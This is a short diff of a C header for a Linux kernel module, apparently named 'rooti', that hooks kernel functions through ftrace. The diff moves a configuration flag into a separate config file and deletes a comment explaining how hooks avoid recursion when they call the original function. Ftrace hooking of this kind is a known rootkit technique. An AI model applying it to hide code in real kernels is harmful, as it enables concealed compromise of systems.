@@ -2,20 +2,10 @@
 #define _ROOTI_HOOKING_FUNC_H
 
 #include <linux/ftrace.h>
+#include "../config.h"
 
-/* 
- * Recursion loops protection mechanism - often times hook functions in this module
- * will call their original predecessor. The call to the original kernel function would trigger the
- * ftrace callback, which would in turn point to the hook function, which would call the original function
- * and so on and so forth. We've got two ways to handle this:
- * 1. Skip the call to ftrace by setting the original function pointer (e.g rooti_function_hook.orig) to the memory
- *    address of the instruction after the instruction to call ftrace. Used by setting ROOTI_USE_FENTRY_OFFSET
- * 2. Check the return address of the traced function to ensure that the callback will point to the hook function
- *    only if the original function was NOT called by the hook function itself.
- *    Used by clearing ROOTI_USE_FENTRY_OFFSET
- */
-#define ROOTI_USE_FENTRY_OFFSET 0
-#if !ROOTI_USE_FENTRY_OFFSET
+
+#ifndef ROOTI_USE_FENTRY_OFFSET
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 #endif
 
